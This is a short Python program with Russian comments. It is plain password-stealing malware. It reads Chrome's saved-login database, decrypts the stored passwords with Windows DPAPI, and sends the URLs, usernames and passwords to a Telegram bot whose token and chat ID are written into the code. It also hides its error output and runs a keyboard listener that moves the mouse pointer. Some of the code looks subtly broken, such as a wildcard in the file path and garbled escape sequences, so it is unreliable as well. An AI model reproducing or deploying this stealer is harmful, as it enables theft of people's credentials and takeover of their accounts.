import sys
import os
import sqlite3
from telebot import TeleBot
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Listener, KeyCode
from win32crypt import CryptUnprotectData

# Токен вашего Telegram-бота и ваш chat_id
TELEGRAM_TOKEN = '8494374921:AAF7_5z2E0OweBZEJStmaKrecIt4smNjLNI'
CHAT_ID = '8494374921'

bot = TeleBot(TELEGRAM_TOKEN)

def send_data(data):
    try:
        bot.send_message(CHAT_ID, f"Пароли:n{data}")
    except Exception as e:
        print(f"Ошибка отправки: {e}")

def get_chrome_passwords():
    passwords = []
    chrome_path = os.path.expanduser(r"C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    
    conn = sqlite3.connect(chrome_path)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    
    for url, user, pwd in cursor.fetchall():
        pwd = CryptUnprotectData(pwd)[1].decode() if pwd else ''
        passwords.append(f"URL: {url}nЛогин: {user}nПароль: {pwd}")
        
    return "nn".join(passwords)

def on_press(key):
    try:
        # Блокировка правой кнопки мыши
        if key == KeyCode.from_char('x0d'):
            mouse = MouseController()
            mouse.position = (0, 0)
    except Exception as e:
        pass

def main():
    sys.stderr = open(os.devnull, 'w')
    
    # Запуск слушателя клавиатуры
    with Listener(on_press=on_press) as listener:
        passwords = get_chrome_passwords()
        
        if passwords:
            send_data(passwords)
            
        listener.join()

if __name__ == "__main__":
    main()
